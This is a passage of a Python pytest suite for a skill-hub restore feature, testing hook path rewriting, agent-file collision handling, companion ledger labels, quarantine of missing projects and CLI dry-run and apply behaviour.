    # A non-leading `~` was never tokenized — the field never carried the
    # token — so this is False even though the string literally starts with
    # "~/.skill-hub"; a prefix guess would get this one wrong.
    assert by_field[("hooks.tilde.command", "~/.skill-hub/s/x.sh")] is False
    assert by_field[("hooks.outside.command", "/opt/tools/lint.sh")] is False

    # The default empty set makes every row False.
    default_rows = restore.collect_machine_absolute(resolved)
    assert all(row["rewritten"] is False for row in default_rows)


def test_a_tokenized_hook_command_lands_on_this_machines_data_home(tmp_data_home, tmp_path):
    """T10. A snapshot whose hook command is a `{DATA_HOME}` token expands to
    this machine's absolute path, and a script that exists here is not broken."""
    script = tmp_data_home / "skills" / "s" / "scripts" / "x.sh"
    script.parent.mkdir(parents=True, exist_ok=True)
    script.write_text("#!/bin/sh\n")

    incoming = {
        "version": "1",
        "skills": {},
        "bundles": {},
        "projects": {},
        "hooks": {"h": {"event": "PreToolUse", "command": str(script)}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)

    # Rewrite the snapshot's registry.yaml so the command reads the raw token,
    # independent of whatever assemble_snapshot's own transform produced.
    reg_path = dest / "registry.yaml"
    data = yaml.safe_load(reg_path.read_text())
    data["hooks"]["h"]["command"] = "{DATA_HOME}/skills/s/scripts/x.sh"
    reg_path.write_text(yaml.safe_dump(data, sort_keys=False))

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    hook = next(h for h in plan["executable_state"]["hooks"] if h["name"] == "h")
    assert hook["command"] == str(script)
    assert hook["broken"] is False


def test_the_printed_plan_names_the_rewritten_path(
    tmp_data_home, tmp_path, outside, capsys
):
    """T18, machine-absolute half (the companion half is unit 8 / wave B2). A
    rewritten row and a verbatim row print distinct wording."""
    script = tmp_data_home / "skills" / "s" / "scripts" / "x.sh"
    script.parent.mkdir(parents=True, exist_ok=True)
    script.write_text("#!/bin/sh\n")
    outside_script = outside / "bin" / "lint.sh"
    outside_script.parent.mkdir(parents=True, exist_ok=True)
    outside_script.write_text("#!/bin/sh\n")

    incoming = {
        "version": "1",
        "skills": {},
        "bundles": {},
        "projects": {},
        "hooks": {
            "rewritten": {"event": "PreToolUse", "command": str(script)},
            "verbatim": {"event": "PreToolUse", "command": str(outside_script)},
        },
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    hub._print_restore_plan(plan)
    out = _plain(capsys.readouterr().out)
    assert f"{script} — rewritten for this machine's data home" in out
    assert f"{outside_script} — carried verbatim; verify on this machine" in out


# ─────────────────────────────────────────────────────────────────────────────
# 5. Three-way collision on out-of-home files (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def _agents_snapshot(tmp_data_home, tmp_path, monkeypatch, agent_body: str) -> Path:
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    (agents / "reviewer.md").write_text(agent_body)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    return dest


def test_three_way_identical_skips_missing_writes_differs_writes_a_sibling(
    tmp_data_home, tmp_path, monkeypatch
):
    dest = _agents_snapshot(tmp_data_home, tmp_path, monkeypatch, "from the backup\n")
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    snap = {"dir": dest, "source": str(dest), "key": "k", "detail": ""}

    def _plan(force=False):
        return restore.build_plan(
            snap, target_registry={}, mode="replace", data_home=tmp_data_home,
            code_home=None, home=Path.home(), trust_new_key=True,
            accept_executable_state=True, force=force,
        )

    # (a) identical → skip
    item = next(i for i in _plan()["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "skip"

    # (b) missing → write
    (agents / "reviewer.md").unlink()
    plan = _plan()
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "write"
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert (agents / "reviewer.md").read_text() == "from the backup\n"

    # (c) differs → sibling, and the LOCAL file is left exactly as it was
    (agents / "reviewer.md").write_text("edited on this machine\n")
    plan = _plan()
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "sibling"
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert (agents / "reviewer.md").read_text() == "edited on this machine\n"
    assert (agents / "reviewer.md.from-backup").read_text() == "from the backup\n"

    # (d) --force overwrites, but only after backing the local file up
    plan = _plan(force=True)
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "overwrite"
    result = restore.apply_plan(plan, data_home=tmp_data_home)
    assert (agents / "reviewer.md").read_text() == "from the backup\n"
    saved = [b for b in result["backups"] if b["source"].endswith("reviewer.md")]
    assert saved and Path(saved[0]["backup"]).read_text() == "edited on this machine\n"


def test_links_are_filtered_to_members_that_actually_landed(tmp_data_home, tmp_path):
    claude_agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    claude_agents.mkdir(parents=True, exist_ok=True)
    (claude_agents / "reviewer.md").write_text("---\nname: reviewer\n---\nr\n")
    (tmp_data_home / "state" / "subagents").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "state" / "subagents" / "links.json").write_text(
        json.dumps(
            {
                "links": [
                    # both members present in the snapshot
                    {"name": "reviewer", "scope": "user", "harnesses": ["claude-code"]},
                    # a member that was never captured → must be dropped
                    {"name": "ghost", "scope": "user", "harnesses": ["claude-code", "codex"]},
                ]
            }
        )
    )
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert [l["name"] for l in plan["links"]["restored"]] == ["reviewer"]
    dropped = plan["links"]["dropped"]
    assert [d["name"] for d in dropped] == ["ghost"]
    assert "codex" in dropped[0]["reason"]


def test_links_merge_with_the_targets_existing_entries(tmp_data_home, tmp_path):
    from skill_hub.infrastructure.harnesses import subagent_links

    claude_agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    claude_agents.mkdir(parents=True, exist_ok=True)
    (claude_agents / "reviewer.md").write_text("---\nname: reviewer\n---\nr\n")
    (tmp_data_home / "state" / "subagents").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "state" / "subagents" / "links.json").write_text(
        json.dumps({"links": [{"name": "reviewer", "scope": "user",
                               "harnesses": ["claude-code"]}]})
    )
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    # A pre-existing local link that the snapshot knows nothing about.
    subagent_links.write_links(
        [{"name": "local-only", "scope": "user", "harnesses": ["claude-code"]}]
    )
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    restore.apply_plan(plan, data_home=tmp_data_home)
    names = {e["name"] for e in subagent_links.read_links()[0]}
    assert names == {"reviewer", "local-only"}


# ─────────────────────────────────────────────────────────────────────────────
# 5b. Ledger-aware collision report (unit 8, wave B2)
# ─────────────────────────────────────────────────────────────────────────────


def test_companion_agent_claims_joins_on_name_and_harness():
    """T13. `(agent_name, harness_id)` is the only real key — the ledger
    records no path. A claim in the global ledger and one in a project ledger
    both surface, sorted by `(scope, skill)`; a different harness or an
    unclaimed name is `[]`."""
    registry = {
        "companions_global": {
            "orchestrate-advanced": {
                "schema": 2,
                "agent_state": {
                    "reviewer": {"files": {"claude-code": {"written": True}}}
                },
            }
        },
        "projects": {
            "p": {
                "path": "/p",
                "companions": {
                    "other-skill": {
                        "schema": 2,
                        "agent_state": {
                            "reviewer": {"files": {"claude-code": {"written": False}}}
                        },
                    }
                },
            }
        },
    }
    claims = restore.companion_agent_claims(
        registry, harness_id="claude-code", agent_name="reviewer"
    )
    assert claims == [
        {
            "scope": "global",
            "skill": "orchestrate-advanced",
            "written": True,
            "is_backfill": False,
        },
        {"scope": "p", "skill": "other-skill", "written": False, "is_backfill": False},
    ]
    assert (
        restore.companion_agent_claims(registry, harness_id="codex", agent_name="reviewer")
        == []
    )
    assert (
        restore.companion_agent_claims(
            registry, harness_id="claude-code", agent_name="ghost"
        )
        == []
    )

    assert restore._agent_name_from_filename("reviewer.md") == "reviewer"
    assert restore._agent_name_from_filename("reviewer.toml") == "reviewer"
    assert restore._agent_name_from_filename("reviewer.toml.disabled") == "reviewer"


def test_companion_agent_claims_falls_through_to_the_agents_list_on_a_harness_gap():
    """R3 (review 4b #3). A v2 entry (`schema: 2`) keeps its own `agents` list
    alongside `agent_state` (AGENTS.md §Data Model). When `agent_state`
    claims the agent but never recorded THIS harness in its `files` map, the
    claim falls through to the `agents` list instead of vanishing — reported
    claimed, `written: false`, and `is_backfill: false` because the entry
    itself is a v2 one, not a pre-v2 ledger."""
    registry = {
        "companions_global": {
            "skillx": {
                "schema": 2,
                "agents": ["reviewer"],
                "agent_state": {
                    "reviewer": {"files": {"codex": {"written": True}}}
                },
            }
        }
    }
    claims = restore.companion_agent_claims(
        registry, harness_id="claude-code", agent_name="reviewer"
    )
    assert claims == [
        {"scope": "global", "skill": "skillx", "written": False, "is_backfill": False}
    ]


def test_a_sibling_collision_on_a_companion_agent_is_labelled(tmp_data_home, tmp_path):
    """T14. A companions ledger claiming `reviewer` labels the `sibling` row;
    the local file is left untouched after `apply_plan` — the write behaviour
    did not change."""
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    (agents / "reviewer.md").write_text("from the backup\n")
    hub.save_registry(
        {
            "version": "1",
            "skills": {},
            "projects": {},
            "bundles": {},
            "companions_global": {
                "orchestrate-advanced": {
                    "schema": 2,
                    "agent_state": {
                        "reviewer": {"files": {"claude-code": {"written": True}}}
                    },
                }
            },
        }
    )
    dest = tmp_path / "snap"
    snapshot(dest)

    (agents / "reviewer.md").write_text("edited on this machine\n")
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "sibling"
    assert item["companion"] == {
        "agent": "reviewer",
        "skills": ["orchestrate-advanced"],
        "scopes": ["global"],
        "written": True,
        "written_pairs": [{"skill": "orchestrate-advanced", "scope": "global"}],
        "backfill_pairs": [],
        "d9_pairs": [],
    }
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert (agents / "reviewer.md").read_text() == "edited on this machine\n"


def test_a_hand_authored_agent_collision_carries_no_label(
    tmp_data_home, tmp_path, claude_global_doc
):
    """T15. No companions ledger claims `reviewer` → `companion is None` on
    the `sibling` row, and `global_docs[]` rows never carry the `companion`
    key at all — a global doc is not an agent."""
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    (agents / "reviewer.md").write_text("from the backup\n")
    claude_home = Path(os.environ["SKILL_HUB_CLAUDE_HOME"])
    claude_home.mkdir(parents=True, exist_ok=True)
    (claude_home / "CLAUDE.md").write_text("# global instructions\n")

    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    (agents / "reviewer.md").write_text("edited on this machine\n")
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "sibling"
    assert item["companion"] is None

    assert plan["global_docs"], "seeded a CLAUDE.md — expected a global-doc row"
    assert all("companion" not in row for row in plan["global_docs"])


def test_a_ledger_that_recorded_no_written_copy_says_so():
    """T16. `written` reflects the ledger's own record, not existence: a v2
    entry with `written: False` says so, and so does a pre-v2 entry that
    predates per-harness state entirely (`agents: [...]`, no `agent_state`)."""
    registry = {
        "companions_global": {
            "orchestrate-advanced": {
                "schema": 2,
                "agent_state": {
                    "reviewer": {"files": {"claude-code": {"written": False}}}
                },
            },
            "legacy-skill": {
                "agents": ["reviewer"],
            },
        }
    }
    claims = restore.companion_agent_claims(
        registry, harness_id="claude-code", agent_name="reviewer"
    )
    by_skill = {claim["skill"]: claim["written"] for claim in claims}
    assert by_skill == {"orchestrate-advanced": False, "legacy-skill": False}
    summary = restore._companion_summary(claims, agent="reviewer")
    assert summary is not None and summary["written"] is False

    # R2 (review 4b #2): the two `written: false` claims split by ledger
    # version — `orchestrate-advanced` is a v2 entry (D9 `already_present`,
    # `hub sync` really does skip it); `legacy-skill` is a pre-v2 entry (the
    # next `hub sync` still backfills or removes it) — never collapsed into
    # one bit that speaks for the wrong bucket.
    assert summary["written_pairs"] == []
    assert summary["d9_pairs"] == [{"skill": "orchestrate-advanced", "scope": "global"}]
    assert summary["backfill_pairs"] == [{"skill": "legacy-skill", "scope": "global"}]


def test_a_pre_v2_unwritten_claim_says_the_next_sync_still_resolves_it(
    tmp_data_home, tmp_path, capsys
):
    """R2 (review 4b #2). A pre-v2 (`schema` != 2, no `agent_state`) ledger
    entry's `written: false` claim does NOT mean `hub sync` leaves the file
    alone — `ships_with_reconcile`'s `is_backfill` path either records the
    local file as the tracked copy (`OP_AGENT_HASH`, the agent is still
    declared) or deletes it (`OP_AGENT_STALE`, it is not). The printed
    sentence must say so, not the D9 'leaves its content alone' wording that
    is only true for a v2 entry."""
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    (agents / "reviewer.md").write_text("from the backup\n")
    hub.save_registry(
        {
            "version": "1",
            "skills": {},
            "projects": {},
            "bundles": {},
            "companions_global": {"legacy-skill": {"agents": ["reviewer"]}},
        }
    )
    dest = tmp_path / "snap"
    snapshot(dest)

    (agents / "reviewer.md").write_text("edited on this machine\n")
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "sibling"
    assert item["companion"] == {
        "agent": "reviewer",
        "skills": ["legacy-skill"],
        "scopes": ["global"],
        "written": False,
        "written_pairs": [],
        "backfill_pairs": [{"skill": "legacy-skill", "scope": "global"}],
        "d9_pairs": [],
    }

    hub._print_restore_plan(plan)
    out = _plain(capsys.readouterr().out)
    assert "the next `hub sync` records this file as the tracked copy" in out
    assert "leaves its content alone" not in out


def test_the_companion_field_is_present_on_every_subagent_verdict(
    tmp_data_home, tmp_path, monkeypatch
):
    """T17. Grill #12. `companion` is present on `skip`, `write` AND
    `unsupported` rows alike — never only on a collision — so a `--json`
    consumer never has to branch on key absence. The `unsupported` row comes
    from a harness with no agents dir on THIS machine; `quiet.md` is
    byte-identical on both sides, producing the `skip` verdict (R8, review
    4b #8 — the fixture used to produce only `write` and `unsupported`)."""
    claude_agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    claude_agents.mkdir(parents=True, exist_ok=True)
    (claude_agents / "reviewer.md").write_text("from the backup\n")
    (claude_agents / "quiet.md").write_text("identical either way\n")

    codex_agents = Path(os.environ["CODEX_HOME"]) / "agents"
    codex_agents.mkdir(parents=True, exist_ok=True)
    (codex_agents / "reviewer.toml").write_text('name = "reviewer"\n')

    hub.save_registry(
        {
            "version": "1",
            "skills": {},
            "projects": {},
            "bundles": {},
            "companions_global": {
                "orchestrate-advanced": {
                    "schema": 2,
                    "agent_state": {
                        "reviewer": {
                            "files": {
                                "claude-code": {"written": True},
                                "codex": {"written": True},
                            }
                        },
                        "quiet": {"files": {"claude-code": {"written": True}}},
                    },
                }
            },
        }
    )
    dest = tmp_path / "snap"
    snapshot(dest)

    # Missing locally → "write" for claude-code's reviewer. quiet.md is
    # untouched after the snapshot → byte-identical → "skip".
    (claude_agents / "reviewer.md").unlink()

    # Simulate codex not being installed on the RESTORE machine.
    import dataclasses

    from skill_hub.infrastructure.harnesses import harnesses

    patched = dict(harnesses.HARNESSES)
    patched["codex"] = dataclasses.replace(patched["codex"], agents_dir=None)
    monkeypatch.setattr(harnesses, "HARNESSES", patched)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    by_name = {i["name"]: i for i in plan["subagents"]}
    assert by_name["reviewer.md"]["action"] == "write"
    assert by_name["quiet.md"]["action"] == "skip"
    assert by_name["reviewer.toml"]["action"] == "unsupported"
    expected_agent = {"reviewer.md": "reviewer", "quiet.md": "quiet", "reviewer.toml": "reviewer"}
    for row in plan["subagents"]:
        assert "companion" in row
        assert row["companion"]["agent"] == expected_agent[row["name"]]


def test_the_printed_plan_names_the_companion(tmp_data_home, tmp_path, monkeypatch, capsys):
    """T18, companion half (the machine-absolute half is B1). `sibling`
    prints the exact `hub skill companions resolve` sentence; `skip` and
    `unsupported` print no companion sentence at all, even though their rows
    also carry a non-`None` `companion` value."""
    claude_agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    claude_agents.mkdir(parents=True, exist_ok=True)
    (claude_agents / "reviewer.md").write_text("from the backup\n")
    (claude_agents / "quiet.md").write_text("identical either way\n")

    codex_agents = Path(os.environ["CODEX_HOME"]) / "agents"
    codex_agents.mkdir(parents=True, exist_ok=True)
    (codex_agents / "reviewer.toml").write_text('name = "reviewer"\n')

    hub.save_registry(
        {
            "version": "1",
            "skills": {},
            "projects": {},
            "bundles": {},
            "companions_global": {
                "orchestrate-advanced": {
                    "schema": 2,
                    "agent_state": {
                        "reviewer": {
                            "files": {
                                "claude-code": {"written": True},
                                "codex": {"written": True},
                            }
                        },
                        "quiet": {
                            "files": {"claude-code": {"written": True}}
                        },
                    },
                }
            },
        }
    )
    dest = tmp_path / "snap"
    snapshot(dest)

    # claude-code's reviewer diverges → sibling; quiet.md stays identical →
    # skip; codex becomes unsupported on the RESTORE machine.
    (claude_agents / "reviewer.md").write_text("edited on this machine\n")
    import dataclasses

    from skill_hub.infrastructure.harnesses import harnesses

    patched = dict(harnesses.HARNESSES)
    patched["codex"] = dataclasses.replace(patched["codex"], agents_dir=None)
    monkeypatch.setattr(harnesses, "HARNESSES", patched)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    by_name = {i["name"]: i["action"] for i in plan["subagents"]}
    assert by_name["reviewer.md"] == "sibling"
    assert by_name["quiet.md"] == "skip"
    assert by_name["reviewer.toml"] == "unsupported"
    assert all(i["companion"] is not None for i in plan["subagents"])

    hub._print_restore_plan(plan)
    out = _plain(capsys.readouterr().out)
    assert (
        "ships_with companion of orchestrate-advanced (global) — `hub sync` "
        "reports a mismatch here as companion drift" in out
    )
    assert (
        "hub skill companions resolve orchestrate-advanced --agent reviewer "
        "--global --op keep-mine|keep-skill" in out
    )
    # Only the ONE sibling row prints the sentence — a claimed `skip` and a
    # claimed `unsupported` both stay quiet.
    assert out.count("ships_with companion of") == 1


def test_multiple_claiming_skills_each_get_their_own_runnable_resolve_command(
    tmp_data_home, tmp_path, capsys
):
    """R1/R4 (review 4b #1/#4). Two skills — one in the global ledger, one in
    a project's — both claim `reviewer` with a written copy. The printed fix
    is never `comp['skills'][0]` (silently dropping the second claimant): it
    is one full, runnable `hub skill companions resolve <skill> --agent
    <agent> {--global | --project <p>} --op keep-mine|keep-skill` command per
    claiming (skill, scope) pair."""
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    (agents / "reviewer.md").write_text("from the backup\n")
    hub.save_registry(
        {
            "version": "1",
            "skills": {},
            "projects": {"p": {"path": "/p", "companions": {}}},
            "bundles": {},
            "companions_global": {
                "orchestrate-advanced": {
                    "schema": 2,
                    "agent_state": {
                        "reviewer": {"files": {"claude-code": {"written": True}}}
                    },
                }
            },
        }
    )
    registry = hub.load_registry()
    registry["projects"]["p"]["companions"]["other-skill"] = {
        "schema": 2,
        "agent_state": {"reviewer": {"files": {"claude-code": {"written": True}}}},
    }
    hub.save_registry(registry)

    dest = tmp_path / "snap"
    snapshot(dest)

    (agents / "reviewer.md").write_text("edited on this machine\n")
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "sibling"
    assert item["companion"]["written_pairs"] == [
        {"skill": "orchestrate-advanced", "scope": "global"},
        {"skill": "other-skill", "scope": "p"},
    ]

    hub._print_restore_plan(plan)
    out = _plain(capsys.readouterr().out)
    assert (
        "hub skill companions resolve orchestrate-advanced --agent reviewer "
        "--global --op keep-mine|keep-skill" in out
    )
    assert (
        "hub skill companions resolve other-skill --agent reviewer "
        "--project p --op keep-mine|keep-skill" in out
    )


# ─────────────────────────────────────────────────────────────────────────────
# 6. Quarantine + the phantom-tree regression (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def test_a_missing_project_path_is_quarantined_not_dropped(tmp_data_home, tmp_path, outside):
    incoming = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {"ghost": {"path": str(outside / "never-cloned"), "bundles": []}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["resolved_registry"]["projects"]["ghost"]["path_unresolved"] is True
    assert plan["report"]["unresolved_projects"] == ["ghost"]
    assert any("QUARANTINED" in w for w in plan["warnings"])


def test_sync_never_conjures_a_phantom_project_tree(tmp_data_home, tmp_path, capsys):
    """Regression: sync used to mkdir -p a nonexistent project path.

    That created a tree the user never made AND — via the Codex permission
    adapter — pre-granted `trust_level = "trusted"` on it, so a later real
    checkout at that path would start out trusted.
    """
    phantom = tmp_path / "not-cloned-yet"
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {
            "version": "1",
            "harnesses_global": ["claude-code"],
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "bundles": {},
            "projects": {"ghost": {"path": str(phantom), "bundles": [], "enabled": ["alpha"]}},
        }
    )

    class _A:
        skip_remotes = True
        skip_backup = True

    hub.cmd_sync(_A())
    assert not phantom.exists(), "sync created a project tree that never existed"
    out = _plain(capsys.readouterr().out)
    assert "skipped" in out and "path does not exist" in out

    report = json.loads(hub.sync_report_path().read_text())
    assert report["projects"]["ghost"]["quarantined"]
    assert report["projects"]["ghost"]["outcome"] == "skipped"
    assert report["projects"]["ghost"]["skip_reason"]
    assert report["projects"]["ghost"]["ok"] is True  # expected state, not a failure


def test_sync_skips_a_project_flagged_path_unresolved_even_if_the_path_exists(
    tmp_data_home, tmp_path
):
    """The flag is authoritative: it survives until `hub project edit-path` clears it."""
    real = tmp_path / "actually-here"
    real.mkdir()
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {
            "version": "1",
            "harnesses_global": ["claude-code"],
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "bundles": {},
            "projects": {
                "flagged": {
                    "path": str(real), "bundles": [], "enabled": ["alpha"],
                    "path_unresolved": True,
                }
            },
        }
    )

    class _A:
        skip_remotes = True
        skip_backup = True

    hub.cmd_sync(_A())
    assert not (real / ".claude").exists()


# ─────────────────────────────────────────────────────────────────────────────
# 7. CLI surface
# ─────────────────────────────────────────────────────────────────────────────


def test_dry_run_is_the_default_and_writes_nothing(tmp_data_home, tmp_path, capsys):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {"version": "1", "skills": {}, "projects": {}, "bundles": {},
         "backup": {"dir": str(tmp_path / "snap"), "enabled": False}}
    )
    dest = tmp_path / "snap"
    snapshot(dest)

    # Wipe the data home's content so any write would be obvious.
    import shutil

    shutil.rmtree(tmp_data_home / "skills")
    before = sorted(p.name for p in tmp_data_home.iterdir())

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", trust_new_key=True,
                        accept_executable_state=True))
    out = _plain(capsys.readouterr().out)
    assert "dry run — nothing written" in out
    assert sorted(p.name for p in tmp_data_home.iterdir()) == before
    assert not (tmp_data_home / "skills").exists()


def test_apply_writes_and_sets_pending_reconcile_which_holds_the_push(
    tmp_data_home, tmp_path, outside, capsys, monkeypatch
):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry(
        {
            "version": "1",
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "projects": {}, "bundles": {},
        }
    )
    dest = tmp_path / "snap"
    snapshot(dest)
    import shutil

    shutil.rmtree(tmp_data_home / "skills")

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True,
                        trust_new_key=True, accept_executable_state=True))
    capsys.readouterr()
    assert (tmp_data_home / "skills" / "alpha" / "SKILL.md").is_file()

    reg = hub._read_registry_optional()
    assert reg["bootstrap"]["restored_from"] == str(dest)
    assert reg["bootstrap"]["completed_at"]
    assert backup.load_backup_config(reg)["pending_reconcile"] is True

    # …and the push gate honours it.
    cfg = backup.load_backup_config(reg)
    cfg["dir"] = str(outside / "backup-repo")
    cfg["remote"] = "git@example.invalid:me/backup.git"
    cfg["enabled"] = True
    backup.save_backup_config(reg, cfg)
    hub.save_registry(reg)
    result = backup.run_backup(hub._read_registry_optional(), push=True, force=True)
    assert result["push_attempted"] is False
    assert any("restore is pending reconciliation" in w for w in result["warnings"])

    # `hub backup now --acknowledge-restore` is the one way to clear it.
    hub.cmd_backup_now(
        argparse.Namespace(json=True, no_push=True, allow_secret=None,
                           acknowledge_restore=True)
    )
    capsys.readouterr()
    assert backup.load_backup_config(hub._read_registry_optional())["pending_reconcile"] is False


def test_cli_refuses_a_populated_target_without_a_mode(
    tmp_data_home, tmp_path, outside, capsys
):
    hub.save_registry({"version": "1", "skills": {}, "bundles": {},
                       "projects": {"local": {"path": str(outside)}}})
    dest = tmp_path / "snap"
    snapshot(dest)
    with pytest.raises(SystemExit) as exc:
        hub.cmd_restore(_ns(from_=str(dest), apply=True, trust_new_key=True,
                            accept_executable_state=True))
    assert exc.value.code == 1
    out = _plain(capsys.readouterr().out)
    assert "--mode replace" in out


def test_cli_json_shape_is_machine_readable(tmp_data_home, tmp_path, capsys):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    hub.cmd_restore(_ns(from_=str(dest), mode="replace", json=True,
                        trust_new_key=True, accept_executable_state=True))
    payload = json.loads(capsys.readouterr().out)
    for key in (
        "ok", "fatal", "schema_version", "source", "snapshot_dir", "integrity",
        "manifest", "registry", "projects", "data", "subagents", "global_docs",
        "links", "executable_state", "report", "next_steps", "warnings", "errors",
    ):
        assert key in payload, key
    # The full resolved registry is an apply INPUT, not part of the wire shape.
    assert "resolved_registry" not in payload
    assert payload["integrity"]["trust"]["state"] in (
        restore.TRUST_NEW_KEY, restore.TRUST_VERIFIED
    )


def test_restore_never_runs_sync_unless_asked(tmp_data_home, tmp_path, monkeypatch):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    calls: list = []
    monkeypatch.setattr(hub, "cmd_sync", lambda args: calls.append(args))

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True,
                        trust_new_key=True, accept_executable_state=True))
    assert calls == []

    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True, sync=True,
                        trust_new_key=True, accept_executable_state=True))
    assert len(calls) == 1
    # The opt-in sync is LOCAL: it must not push the backup, nor dial a remote box.
    assert calls[0].skip_remotes is True
    assert calls[0].skip_backup is True


# ─────────────────────────────────────────────────────────────────────────────
# 8. `hub source restore` (design §6)
# ─────────────────────────────────────────────────────────────────────────────


def _git(*args, cwd=None):
    return subprocess.run(
        ["git", *args], cwd=str(cwd) if cwd else None,
        capture_output=True, text=True, check=True,
    )


@pytest.fixture
def git_origin(tmp_path_factory):
    """A real (tiny) git repo to act as a source's upstream."""
    repo = tmp_path_factory.mktemp("origin")
    _git("init", "-q", "-b", "main", str(repo))
    skill = repo / "skills" / "shared"
